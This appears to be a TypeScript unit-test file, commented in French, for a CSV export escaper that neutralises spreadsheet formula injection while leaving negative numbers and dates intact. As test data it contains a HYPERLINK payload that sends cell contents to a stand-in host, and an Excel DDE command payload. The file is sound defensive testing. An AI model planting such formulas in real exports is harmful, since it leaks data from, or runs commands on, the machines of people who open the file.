import { test } from '@japa/runner'
import { buildCsv, escapeCell } from '#services/csv_export_service'

/**
 * Injection de formule dans les exports CSV (#773, CWE-1236).
 *
 * Les deux escapers du repo appliquaient correctement la mise entre
 * guillemets RFC 4180 et aucun des deux ne neutralisait les caractères qui
 * font qu'un tableur interprète une cellule comme une formule. Les deux
 * exports posent en plus un BOM UTF-8, ce qui dit explicitement que le
 * consommateur visé est Excel : le tableur qui évalue.
 *
 * Le chemin d'attaque n'est pas l'auto-sabotage : les champs concernés
 * (`notes`, `title`, `supplier`, `reference`…) sont aussi **écrits par
 * l'import CSV**. Qui peut importer peut donc empoisonner des lignes que
 * quelqu'un d'autre exportera et ouvrira plus tard — en confiance, puisque le
 * fichier vient de notre app.
 *
 * Le point délicat est de ne pas casser les nombres au passage : un export
 * dont toutes les valeurs sont devenues du texte est une régression
 * fonctionnelle. D'où les témoins numériques ci-dessous.
 */

/** Décode le CSV rendu par `buildCsv`, BOM compris. */
function lines(buffer: Buffer): string[] {
  return buffer
    .toString('utf-8')
    .replace(/^\uFEFF/, '')
    .split('\r\n')
}

test.group('CSV export — formula injection (unit)', () => {
  test('neutralizes every leading character a spreadsheet would evaluate', ({ assert }) => {
    assert.equal(escapeCell('=1+1'), `"'=1+1"`)
    assert.equal(escapeCell('@SUM(A1)'), `"'@SUM(A1)"`)
    assert.equal(escapeCell('\tSUM(A1)'), `"'\tSUM(A1)"`)
    assert.equal(escapeCell('\rSUM(A1)'), `"'\rSUM(A1)"`)
  })

  test('neutralizes the exfiltration payload the issue names', ({ assert }) => {
    const payload = '=HYPERLINK("https://exemple.invalid/?d="&A1,"Facture")'

    const escaped = escapeCell(payload)

    assert.isTrue(escaped.startsWith(`"'=`), 'la formule doit être désamorcée')
    // Les guillemets internes restent doublés : l'échappement RFC 4180
    // continue de s'appliquer par-dessus l'apostrophe.
    assert.include(escaped, '""https://exemple.invalid/?d=""')
  })

  test('neutralizes the Excel DDE family', ({ assert }) => {
    assert.equal(escapeCell("=cmd|'/c calc'!A0"), `"'=cmd|'/c calc'!A0"`)
  })

  // --- les témoins : ce qui ne doit PAS bouger ---

  test('leaves a legitimate negative number usable', ({ assert }) => {
    // Le piège de ce correctif. `-42` commence par un caractère de la liste
    // noire et n'est pourtant pas une formule.
    assert.equal(escapeCell('-42'), '-42')
    assert.equal(escapeCell('-42.50'), '-42.50')
    assert.equal(escapeCell('-1234,56'), '-1234,56')
    assert.equal(escapeCell(-42), '-42')
  })

  test('never prefixes a number, whatever its sign', ({ assert }) => {
    assert.equal(escapeCell(0), '0')
    assert.equal(escapeCell(1234.56), '1234.56')
  })

  test('leaves an ISO date alone', ({ assert }) => {
    assert.equal(escapeCell('2026-05-04'), '2026-05-04')
  })

  test('does not let a numeric-looking formula through the exemption', ({ assert }) => {
    // L'exemption est ancrée : tout ce qui n'est pas *exactement* un littéral
    // numérique retombe dans le cas neutralisé.
    assert.equal(escapeCell('-1+1'), `"'-1+1"`)
    assert.equal(escapeCell('-42=A1'), `"'-42=A1"`)
  })

  // --- l'échappement RFC 4180, qui doit survivre ---

  test('still quotes separators, quotes and newlines', ({ assert }) => {
    assert.equal(escapeCell('Marina; Bleue'), '"Marina; Bleue"')
    assert.equal(escapeCell('Il a dit "oui"'), '"Il a dit ""oui"""')
    assert.equal(escapeCell('ligne 1\nligne 2'), '"ligne 1\nligne 2"')
  })

  test('handles a value that is both a formula and separator-laden', ({ assert }) => {
    assert.equal(escapeCell('=1+1; DROP'), `"'=1+1; DROP"`)
  })

  test('renders empty for null and undefined', ({ assert }) => {
    assert.equal(escapeCell(null), '')
    assert.equal(escapeCell(undefined), '')
    assert.equal(escapeCell(''), '')
  })

  // --- le constructeur complet ---

  test('buildCsv applies the escaping to headers and rows alike', ({ assert }) => {
    const csv = buildCsv(
      ['date', 'notes'],
      [
        ['2026-05-04', '=1+1'],
        ['2026-05-05', -42],
      ]
    )

    assert.deepEqual(lines(csv), ['date;notes', `2026-05-04;"'=1+1"`, '2026-05-05;-42'])
  })

  test('buildCsv keeps the UTF-8 BOM', ({ assert }) => {
    assert.isTrue(
      buildCsv(['a'], [['b']])
        .toString('utf-8')
        .startsWith('\uFEFF')
    )
  })
})
